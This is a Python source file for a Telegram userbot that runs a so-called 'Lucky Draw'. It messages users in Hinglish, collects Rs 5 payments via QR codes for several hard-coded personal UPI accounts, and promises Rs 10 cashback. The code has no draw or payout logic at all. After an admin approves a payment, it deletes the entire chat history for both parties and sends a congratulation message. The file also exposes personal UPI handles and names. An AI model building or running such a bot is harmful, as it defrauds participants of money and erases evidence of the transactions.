import asyncio
import json
import os
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import qrcode
from PIL import Image, ImageDraw, ImageFont
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')
session_string = os.getenv('SESSION_STRING')

if not session_string:
    logger.error("SESSION_STRING is missing!")
    exit(1)

UPIS = ["varunloves@fam", "kothapellisanjana12@ibl", "kothapellivaruntej07@fam"]
ADMINS = [x.strip() for x in os.getenv('ADMINS', 'VarunsLuckyDraw,8935742943').split(',')]

client = TelegramClient(StringSession(session_string), api_id, api_hash)

DATA_DIR = '/data'
os.makedirs(DATA_DIR, exist_ok=True)
PARTICIPANTS_FILE = os.path.join(DATA_DIR, 'participants.json')

if not os.path.exists(PARTICIPANTS_FILE):
    with open(PARTICIPANTS_FILE, 'w') as f:
        json.dump([], f)

user_states    = {}   # user_id -> state string
user_upi_index = {}   # user_id -> current UPI index
approving_users = set()


async def load_participants():
    try:
        with open(PARTICIPANTS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return []


async def save_participant(data):
    participants = await load_participants()
    participants.append(data)
    with open(PARTICIPANTS_FILE, 'w') as f:
        json.dump(participants, f, indent=4)


def generate_qr(upi, amount="5", user_id="", timestamp=""):
    upi_url = f"upi://pay?pa={upi}&pn=LuckyDraw&am={amount}&cu=INR"
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(upi_url)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white").convert('RGB')
    draw = ImageDraw.Draw(img)

    try:
        font = ImageFont.truetype("arial.ttf", 20)
    except Exception:
        font = ImageFont.load_default()

    texts = [
        "Lucky Draw Participation",
        f"User ID: {user_id}",
        f"Time: {timestamp}",
        f"Amount: ₹{amount}"
    ]
    y = 10
    for text in texts:
        draw.text((10, y), text, fill="black", font=font)
        y += 30

    filename = os.path.join(DATA_DIR, f"qr_{user_id}_{int(datetime.now().timestamp())}.png")
    img.save(filename)
    return filename


@client.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_private_message(event):
    try:
        user_id = event.sender_id

        if user_id in approving_users:
            return

        message_text = event.raw_text.strip().lower()

        # ── Re-trigger if user types "lucky draw join" in normal state ──
        if user_id in user_states and user_states[user_id] == 'normal':
            if "lucky draw join" in message_text:
                user_states[user_id] = 'waiting_yes_no'
                await event.reply(
                    "🎉 **Lucky Draw Mein Swagat Hai!** 🎉\n\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "🤔 Kya Aap Lucky Draw Mein Join Karna Chahte Ho?\n"
                    "━━━━━━━━━━━━━━━━\n\n"
                    "✅ Join Karne Ke Liye Type Karo ➜ `Yes`\n"
                    "❌ Join Nahi Karna Tho Type Karo ➜ `No`"
                )
            return

        # ── First time user ──
        if user_id not in user_states:
            user_states[user_id] = 'waiting_yes_no'
            await event.reply(
                "🎉 **Lucky Draw Mein Swagat Hai!** 🎉\n\n"
                "━━━━━━━━━━━━━━━━\n"
                "🤔 Kya Aap Lucky Draw Mein Join Karna Chahte Ho?\n"
                "━━━━━━━━━━━━━━━━\n\n"
                "✅ Join Karne Ke Liye Type Karo ➜ `Yes`\n"
                "❌ Join Nahi Karna Tho Type Karo ➜ `No`"
            )
            return

        current_state = user_states.get(user_id)

        # ── State: Yes / No ──
        if current_state == 'waiting_yes_no':
            if message_text == "yes":
                user_states[user_id] = 'waiting_payment'
                user_upi_index[user_id] = 0  # ✅ start at first UPI

                await event.reply(
                    "📋 **Terms & Conditions** 📋\n\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "🍀 Jo account milega woh aapki **luck** pe depend karta hai\n"
                    "🏆 Winner ko milenge **₹10 Cash Back** !\n"
                    "⚠️ Payment hone ke baad **refund nahi hoga**\n"
                    "━━━━━━━━━━━━━━━━\n\n"
                    "💳 Neeche QR Code scan karke **₹5** pay karo aur screenshot bhejo! 👇🏻"
                )

                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                qr_file = generate_qr(UPIS[0], "5", str(user_id), now)
                await event.reply(
                    file=qr_file,
                    message=(
                        "💳 **Payment QR Code**\n\n"
                        "━━━━━━━━━━━━━━━━\n"
                        f"🎟 Product  : Lucky Draw Entry\n"
                        f"💰 Amount   : ₹5\n"
                        f"🆔 User ID  : `{user_id}`\n"
                        f"📅 Date     : {datetime.now().strftime('%d-%m-%Y')}\n"
                        f"🕐 Time     : {datetime.now().strftime('%I:%M %p')}\n"
                        f"💳 UPI      : 1 of {len(UPIS)}\n"
                        "━━━━━━━━━━━━━━━━\n\n"
                        "📸 Payment ke baad **screenshot bhejo** — hum verify kar denge!\n\n"
                        "🔄 QR kaam nahi kar raha? Type karo ➜ `NEW QR`"
                    )
                )

            elif message_text == "no":
                user_states[user_id] = 'normal'
                await event.reply(
                    "😊 **Koi Baat Nahi!**\n\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "🎯 Jab bhi Lucky Draw join karna ho, bas type karo 👇🏻\n\n"
                    "`Lucky Draw Join`\n\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "🍀 Best of luck aage ke liye! 💗"
                )

        # ── State: Waiting for Payment Screenshot ──
        elif current_state == 'waiting_payment':
            if "new qr" in message_text:
                # ✅ Rotate to next UPI
                current_idx = user_upi_index.get(user_id, 0)
                next_idx = (current_idx + 1) % len(UPIS)
                user_upi_index[user_id] = next_idx

                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                qr_file = generate_qr(UPIS[next_idx], "5", str(user_id), now)
                await event.reply(
                    file=qr_file,
                    message=(
                        "🔄 **Naya QR Code Generate Hua!**\n\n"
                        "━━━━━━━━━━━━━━━━\n"
                        f"🎟 Product  : Lucky Draw Entry\n"
                        f"💰 Amount   : ₹5\n"
                        f"🆔 User ID  : `{user_id}`\n"
                        f"📅 Date     : {datetime.now().strftime('%d-%m-%Y')}\n"
                        f"🕐 Time     : {datetime.now().strftime('%I:%M %p')}\n"
                        f"💳 UPI      : {next_idx + 1} of {len(UPIS)}\n"
                        "━━━━━━━━━━━━━━━━\n\n"
                        "📸 Payment ke baad **screenshot bhejo**!\n\n"
                        "🔄 Phir bhi kaam nahi kar raha? Type karo ➜ `NEW QR`"
                    )
                )

            elif event.message.photo or "screenshot" in message_text:
                await event.reply(
                    "✅ **Screenshot Mil Gayi!**\n\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "⏳ Admin verification kar rahe hain...\n"
                    "🕐 Please **5 minutes** wait karo\n"
                    "━━━━━━━━━━━━━━━━\n\n"
                    "💗 Aapka patience ke liye shukriya! 🙏🏻"
                )
                user_states[user_id] = 'waiting_approval'
            else:
                await event.reply(
                    "⚠️ **Oops!**\n\n"
                    "📸 Payment ka **screenshot bhejo** ya type karo ➜ `NEW QR`"
                )

        # ── State: Waiting for Admin Approval ──
        elif current_state == 'waiting_approval':
            await event.reply(
                "⏳ **Already Waiting...**\n\n"
                "━━━━━━━━━━━━━━━━\n"
                "🔍 Admin abhi aapki payment verify kar rahe hain\n"
                "💗 Thoda sa aur wait karo — bas 5 minutes! 🙏🏻\n"
                "━━━━━━━━━━━━━━━━"
            )

    except Exception as e:
        logger.error(f"Error: {e}")


@client.on(events.NewMessage(pattern=r'/approved', func=lambda e: e.is_private))
async def handle_approval(event):
    try:
        sender = await event.get_sender()
        is_admin = (
            str(event.sender_id) in ADMINS or
            (sender.username and sender.username in ADMINS)
        )
        if not is_admin:
            return

        chat_id = event.chat_id
        user_id = chat_id

        approving_users.add(user_id)

        try:
            message_ids = []
            async for msg in client.iter_messages(chat_id):
                message_ids.append(msg.id)

            if message_ids:
                for i in range(0, len(message_ids), 100):
                    batch = message_ids[i:i+100]
                    await client.delete_messages(chat_id, batch, revoke=True)

            await asyncio.sleep(1)

            await client.send_message(
                chat_id,
                "🎉 **Congratulations!** 🎉\n\n"
                "━━━━━━━━━━━━━━━━\n"
                "✅ Aap **Lucky Draw** Mein Successfully Join Ho Gaye!\n"
                "━━━━━━━━━━━━━━━━\n\n"
                "🍀 Ab results ka intezaar karo...\n"
                "🏆 Winner ko milega **₹10 Cash Back**!\n\n"
                "💗 Best of Luck — God bless you! 😸✨"
            )

            data = {
                "chat_id": chat_id,
                "user_id": user_id,
                "time":    datetime.now().isoformat(),
                "payment": "Approved",
                "status":  "Participated"
            }
            await save_participant(data)

            participants = await load_participants()
            count = len(participants)

            try:
                user_entity = await client.get_entity(user_id)
                username = f"@{user_entity.username}" if user_entity.username else "No username"
                nickname = user_entity.first_name or "No name"
            except Exception:
                username = "Unknown"
                nickname = "Unknown"

            log_msg = (
                f"✅ #{count} Joined Lucky Draw\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"👤 User ID   : `{user_id}`\n"
                f"🔗 Username  : {username}\n"
                f"📛 Nickname  : {nickname}\n"
                f"🕐 Time      : {datetime.now().strftime('%d-%m-%Y %I:%M %p')}\n"
                f"━━━━━━━━━━━━━━━━"
            )
            await client.send_message("me", log_msg, parse_mode="md")

            # ✅ Clean up both state and UPI index
            user_states.pop(user_id, None)
            user_upi_index.pop(user_id, None)

            logger.info(f"Approved user {user_id} — chat cleared, approval message sent.")

        finally:
            approving_users.discard(user_id)

    except Exception as e:
        logger.error(f"Approval error: {e}")
        approving_users.discard(event.chat_id)


async def main():
    await client.start()
    logger.info("✅ Lucky Draw Bot Started Successfully!")
    await client.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(main())
